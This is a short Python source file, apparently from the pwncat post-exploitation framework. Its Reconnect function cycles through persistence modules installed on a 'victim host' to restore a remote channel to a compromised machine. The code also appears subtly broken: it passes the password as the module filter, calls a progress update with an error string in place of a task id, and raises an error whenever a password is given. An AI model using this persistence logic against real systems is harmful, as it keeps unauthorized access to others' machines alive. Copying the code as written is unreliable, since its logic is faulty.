#!/usr/bin/env python3
from rich.progress import Progress

import pwncat


def Reconnect(host: str, user: str = None, password: str = None, **kwargs):
    """
    This implements the logic for selecting an installed persistence
    method and utilizing it to build a channel to the victim host.
    It is implemented as a function, but acts like a Channel constructor.
    """

    with Progress(
        "[blue bold]reconnecting[/blue bold]",
        "•",
        "[cyan]{task.fields[module]}[cyan]",
        "•",
        "{task.fields[status]}",
        transient=True,
    ) as progress:
        task_id = progress.add_task(
            "attempt",
            module="initializing",
            status="...",
        )

        for module in pwncat.modules.run(
            "persist.gather", host=host, module=password, progress=progress
        ):

            if module.TYPE.__class__.REMOTE not in module.TYPE:
                continue

            progress.update(task_id, module=module.name, status="...")
            try:
                chan = module.connect(user, progress=progress)
                progress.update(task_id, status="connected!")
                progress.log(f"connected via {module}")
                return chan
            except pwncat.modules.PersistError as exc:
                progress.update(str(exc))
                if password is not None:
                    raise pwncat.channel.ChannelError(f"{host}: {exc}")

    raise pwncat.channel.ChannelError(f"{host}: no working persistence methods")
